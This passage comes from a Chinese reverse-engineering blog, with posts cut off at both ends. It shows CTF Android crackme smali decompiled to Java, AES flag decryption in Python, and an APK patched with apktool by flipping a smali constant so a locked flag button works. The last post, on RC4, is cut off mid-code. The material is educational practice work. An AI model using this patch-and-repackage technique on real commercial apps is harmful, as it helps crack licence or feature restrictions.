class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">.class <span class="keyword">public</span> Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span><br><span class="line">.<span class="keyword">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">"Crackme.java"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">private</span> str2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method <span class="keyword">public</span> constructor &lt;init&gt;()V</span><br><span class="line">    .locals <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">22</span></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">21</span></span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line"></span><br><span class="line">    iput-object v0, p0, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;str2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">23</span></span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;p0, v0&#125;, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;GetFlag(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">24</span></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">GetFlag</span><span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>;</span><br><span class="line">    .locals <span class="number">4</span></span><br><span class="line">    .param p1, "str"    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v3, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">27</span></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2, v3&#125;, Landroid/util/Base64;-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">29</span></span><br><span class="line">    .local v0, <span class="string">"content"</span>:[B</span><br><span class="line">    <span class="keyword">new</span>-instance v1, Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    iget-object v2, p0, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;str2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2, v3&#125;, Landroid/util/Base64;-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v1, v2&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">30</span></span><br><span class="line">    .local v1, <span class="string">"kk"</span>:Ljava/lang/String;</span><br><span class="line">    sget-object v2, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;p0, v0, v1&#125;, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;decrypt([BLjava/lang/String;)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v3</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2, v3&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">31</span></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v2, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-object v2</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">decrypt</span><span class="params">([BLjava/lang/String;)</span>Ljava/lang/String</span>;</span><br><span class="line">    .locals <span class="number">8</span></span><br><span class="line">    .param p1, "content"    # [B</span><br><span class="line">    .param p2, "password"    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">35</span></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v4, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">37</span></span><br><span class="line">    .local v4, <span class="string">"m"</span>:Ljava/lang/String;</span><br><span class="line">    :try_start_0</span><br><span class="line">    invoke-virtual &#123;p2&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">    move-result-object v3</span><br><span class="line"></span><br><span class="line">    .line <span class="number">38</span></span><br><span class="line">    .local v3, <span class="string">"keyStr"</span>:[B</span><br><span class="line">    <span class="keyword">new</span>-instance v2, Ljavax/crypto/spec/SecretKeySpec;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string v7, <span class="string">"AES"</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v2, v3, v7&#125;, Ljavax/crypto/spec/SecretKeySpec;-&gt;&lt;init&gt;([BLjava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    .local v2, <span class="string">"key"</span>:Ljavax/crypto/spec/SecretKeySpec;</span><br><span class="line">    <span class="keyword">const</span>-string v7, <span class="string">"AES/ECB/NoPadding"</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v7&#125;, Ljavax/crypto/Cipher;-&gt;getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">40</span></span><br><span class="line">    .local v0, <span class="string">"cipher"</span>:Ljavax/crypto/Cipher;</span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v7, <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v7, v2&#125;, Ljavax/crypto/Cipher;-&gt;init(ILjava/security/Key;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">41</span></span><br><span class="line">    invoke-virtual &#123;v0, p1&#125;, Ljavax/crypto/Cipher;-&gt;doFinal([B)[B</span><br><span class="line"></span><br><span class="line">    move-result-object v6</span><br><span class="line"></span><br><span class="line">    .line <span class="number">42</span></span><br><span class="line">    .local v6, <span class="string">"result"</span>:[B</span><br><span class="line">    <span class="keyword">new</span>-instance v5, Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v5, v6&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</span><br><span class="line">    :try_end_0</span><br><span class="line">    .<span class="keyword">catch</span> Ljava/security/NoSuchAlgorithmException; &#123;:try_start_0 .. :try_end_0&#125; :catch_1</span><br><span class="line">    .<span class="keyword">catch</span> Ljavax/crypto/NoSuchPaddingException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0</span><br><span class="line">    .<span class="keyword">catch</span> Ljava/security/InvalidKeyException; &#123;:try_start_0 .. :try_end_0&#125; :catch_4</span><br><span class="line">    .<span class="keyword">catch</span> Ljavax/crypto/IllegalBlockSizeException; &#123;:try_start_0 .. :try_end_0&#125; :catch_2</span><br><span class="line">    .<span class="keyword">catch</span> Ljavax/crypto/BadPaddingException; &#123;:try_start_0 .. :try_end_0&#125; :catch_3</span><br><span class="line"></span><br><span class="line">    .end local v4    # "m":Ljava/lang/String;</span><br><span class="line">    .local v5, <span class="string">"m"</span>:Ljava/lang/String;</span><br><span class="line">    move-object v4, v5</span><br><span class="line"></span><br><span class="line">    .line <span class="number">46</span></span><br><span class="line">    .end local v0    # "cipher":Ljavax/crypto/Cipher;</span><br><span class="line">    .end local v2    # "key":Ljavax/crypto/spec/SecretKeySpec;</span><br><span class="line">    .end local v3    # "keyStr":[B</span><br><span class="line">    .end local v5    # "m":Ljava/lang/String;</span><br><span class="line">    .end local v6    # "result":[B</span><br><span class="line">    .restart local v4    # "m":Ljava/lang/String;</span><br><span class="line">    :goto_0</span><br><span class="line">    <span class="keyword">return</span>-object v4</span><br><span class="line"></span><br><span class="line">    .line <span class="number">43</span></span><br><span class="line">    :catch_0</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    .line <span class="number">44</span></span><br><span class="line">    .local v1, <span class="string">"e"</span>:Ljava/security/GeneralSecurityException;</span><br><span class="line">    :goto_1</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/GeneralSecurityException;-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">43</span></span><br><span class="line">    .end local v1    # "e":Ljava/security/GeneralSecurityException;</span><br><span class="line">    :catch_1</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    :catch_2</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    :catch_3</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    :catch_4</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>算了，还是不剖析了，以后碰到smali文件就直接转java文件好了。工具smali2java，得到java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crackme</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str2 = <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Crackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        GetFlag(<span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetFlag</span><span class="params">(String p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] <span class="string">"content"</span> = Base64.decode(p1.getBytes(), <span class="number">0x0</span>);</span><br><span class="line">        String <span class="string">"kk"</span> = <span class="keyword">new</span> String(Base64.decode(str2.getBytes(), <span class="number">0x0</span>));</span><br><span class="line">        System.out.println(decrypt(<span class="string">"content"</span>, <span class="string">"kk"</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] p1, String p2)</span> </span>&#123;</span><br><span class="line">        String <span class="string">"m"</span> = <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">"keyStr"</span> = p2.getBytes();</span><br><span class="line">            SecretKeySpec <span class="string">"key"</span> = <span class="keyword">new</span> SecretKeySpec(<span class="string">"keyStr"</span>, <span class="string">"AES"</span>);</span><br><span class="line">            Cipher <span class="string">"cipher"</span> = Cipher.getInstance(<span class="string">"AES/ECB/NoPadding"</span>);</span><br><span class="line">            <span class="string">"cipher"</span>.init(<span class="number">0x2</span>, <span class="string">"key"</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">"result"</span> = <span class="string">"cipher"</span>.doFinal(p1);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"m"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(NoSuchPaddingException <span class="string">"e"</span>) &#123;</span><br><span class="line">            <span class="string">"e"</span>.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">"m"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这作为普通java文件当然是不能直接运行的，可以稍微修改一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crackme</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str2 = <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Crackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        GetFlag(<span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetFlag</span><span class="params">(String p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.getDecoder().decode(p1);</span><br><span class="line">        String kk = <span class="keyword">new</span> String(Base64.getDecoder().decode(str2));</span><br><span class="line">        System.out.println(decrypt(content, kk));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] p1, String p2)</span> </span>&#123;</span><br><span class="line">        String m = <span class="string">"0x0"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] keyStr = p2.getBytes();</span><br><span class="line">            SecretKeySpec key = <span class="keyword">new</span> SecretKeySpec(keyStr, <span class="string">"AES"</span>);</span><br><span class="line">            Cipher cipher = Cipher.getInstance(<span class="string">"AES/ECB/NoPadding"</span>);</span><br><span class="line">            cipher.init(<span class="number">0x2</span>, key);</span><br><span class="line">            <span class="keyword">byte</span>[] result = cipher.doFinal(p1);</span><br><span class="line">            String s = <span class="keyword">new</span> String(result);</span><br><span class="line">            <span class="keyword">return</span> m;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合test.java，可以直接在命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">    Crackme crack = <span class="keyword">new</span> Crackme();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img alt="" data-src="/2019/04/18/smali/1.JPG" class="lazyload"></p><p>smali转成java后的逻辑很简单，就是AES的解密过程，可以直接用python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"></span><br><span class="line">key=<span class="string">'cGhyYWNrICBjdGYgMjAxNg=='</span> </span><br><span class="line">cipher=<span class="string">'sSNnx1UKbYrA1+MOrdtDTA=='</span> </span><br><span class="line">key=base64.b64decode(key) </span><br><span class="line">cipher=base64.b64decode(cipher) </span><br><span class="line">aes=AES.new(key,AES.MODE_ECB) </span><br><span class="line"><span class="keyword">print</span> aes.decrypt(cipher)</span><br></pre></td></tr></table></figure><p>总结：对于smali文件，能阅读则阅读，比汇编代码还是有好一些；读不懂则直接转java。</p><h3 id="smali反编译"><a href="#smali反编译" class="headerlink" title="smali反编译"></a>smali反编译</h3><p>对于C程序，可以直接修改汇编代码重新编译可改变程序逻辑。那么，对于apk文件，自然也可以修改smali代码回编译来改变apk的逻辑。</p><p>工具：夜神模拟器 apktoolbox v1.6.4  Smali2java</p><p>步骤：反编译apk得到smali文件 –&gt; 修改smali文件 –&gt; 回编译apk</p><h3 id="一道题目体现apk的反编译与回编译"><a href="#一道题目体现apk的反编译与回编译" class="headerlink" title="一道题目体现apk的反编译与回编译"></a>一道题目体现apk的反编译与回编译</h3><p>题目来自于jarvisOJ 爬楼梯</p><p>安卓模拟器打开先开开是个什么鬼</p><p><img alt="" data-src="/2019/04/18/smali/2.JPG" class="lazyload"></p><p>大概就是点击一下爬一层楼，一片的楼层加一，当已爬楼层大于要爬的楼层应该就可以看flag了。</p><p>手点是不可能的了，自动点击又不会，就只能试试能不能py一下了。</p><p>首先用apktool进行反编译，一定要忽略res资源，别问我为什么，为了纪念我消逝的青春</p><p><img alt="" data-src="/2019/04/18/smali/3.JPG" class="lazyload"></p><p>在smali\com\ctf\test\ctf_100找到MainActivity.smali，直接用smali2java转化为java，当然如果你熟悉smali的话可以直接阅读</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> has_gone_int;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> to_reach_int;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> p1)</span></span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(p1);</span><br><span class="line">        setContentView(<span class="number">0x7f040019</span>);</span><br><span class="line">        Button <span class="string">"bt"</span> = (Button)findViewById(<span class="number">0x7f0c0056</span>);</span><br><span class="line">        <span class="string">"bt"</span>.setClickable(<span class="keyword">false</span>);   <span class="comment">//看flag按钮默认无效</span></span><br><span class="line">        has_gone_int = <span class="number">0x0</span>;</span><br><span class="line">        Random <span class="string">"random"</span> = <span class="keyword">new</span> Random();</span><br><span class="line">        to_reach_int = <span class="string">"random"</span>.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(to_reach_int &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            to_reach_int = (to_reach_int * -<span class="number">0x1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0x5</span> &lt; to_reach_int) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        to_reach_int = <span class="string">"random"</span>.nextInt();</span><br><span class="line">        to_reach_int = (to_reach_int % <span class="number">0x20</span>);</span><br><span class="line">        to_reach_int = (to_reach_int * <span class="number">0x4000</span>); </span><br><span class="line">        TextView <span class="string">"tv"</span> = (TextView)findViewById(<span class="number">0x7f0c0053</span>);</span><br><span class="line">        <span class="string">"tv"</span>.setText(<span class="string">""</span> + to_reach_int);</span><br><span class="line">        TextView <span class="string">"tv_result"</span> = (TextView)findViewById(<span class="number">0x7f0c0057</span>);</span><br><span class="line">        <span class="string">"tv_result"</span>.setText(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Btn_up_onclick</span><span class="params">(View p1)</span> </span>&#123;</span><br><span class="line">        has_gone_int = (has_gone_int + <span class="number">0x1</span>);</span><br><span class="line">        String <span class="string">"data"</span> = <span class="string">""</span> + has_gone_int;</span><br><span class="line">        TextView <span class="string">"tv"</span> = (TextView)findViewById(<span class="number">0x7f0c0054</span>);</span><br><span class="line">        <span class="string">"tv"</span>.setText(<span class="string">"data"</span>);</span><br><span class="line">        <span class="keyword">if</span>(to_reach_int &lt;= has_gone_int) &#123;</span><br><span class="line">            Button <span class="string">"bt"</span> = (Button)findViewById(<span class="number">0x7f0c0056</span>);</span><br><span class="line">            <span class="string">"bt"</span>.setClickable(<span class="keyword">true</span>);   <span class="comment">//看flag按钮有效</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn2_onclick</span><span class="params">(View p1)</span> </span>&#123;</span><br><span class="line">        TextView <span class="string">"tv_result"</span> = (TextView)findViewById(<span class="number">0x7f0c0057</span>);</span><br><span class="line">        <span class="string">"tv_result"</span>.setText(<span class="string">"&#123;Flag:"</span> + get_flag(to_reach_int) + <span class="string">"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!Debug.isDebuggerConnected()) &#123;</span><br><span class="line">            System.loadLibrary(<span class="string">"ctf"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只要叫看flag按钮初始化为true就可以了。接下来去修改smali：先找到setClickable，发现两处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke-virtual &#123;v0, v3&#125;, Landroid/widget/Button;-&gt;setClickable(Z)V</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v5&#125;, Landroid/widget/Button;-&gt;setClickable(Z)V</span><br></pre></td></tr></table></figure><p>一个一个来，搜索v3，发现没有v3=0，搜索v5，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const/4 v5, 0x0</span><br></pre></td></tr></table></figure><p>将0x0改为0x1，然后用apktool回编译成apk，用模拟器打开</p><p><img alt="" data-src="/2019/04/18/smali/4.JPG" class="lazyload"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>smali文件就像汇编文件，可以直接修改来改变apk的逻辑，从而达到想要的目的。这里只是小试牛刀，后面还有更大的功能等待挖掘。附上一篇大佬博客以供学习<a href="https://blog.csdn.net/u012573920/article/details/44034397" target="_blank" rel="noopener">https://blog.csdn.net/u012573920/article/details/44034397</a></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> smali </tag>
            
            <tag> android </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逆向踩坑之RC4</title>
      <link href="/2019/04/09/RC4/"/>
      <url>/2019/04/09/RC4/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。该算法的速度可以达到DES加密的10倍左右，且具有很高级别的非线性。RC4起初是用于保护商业机密的。但是在1994年9月，它的算法被发布在互联网上，也就不再有什么商业机密了。RC4也被叫做ARC4（Alleged RC4——所谓的RC4），因为RSA从来就没有正式发布过这个算法。</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>该算法较为简单，文字描述有点绕，直接上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span>   <span class="comment">#data为明文或密文，key为密钥</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = 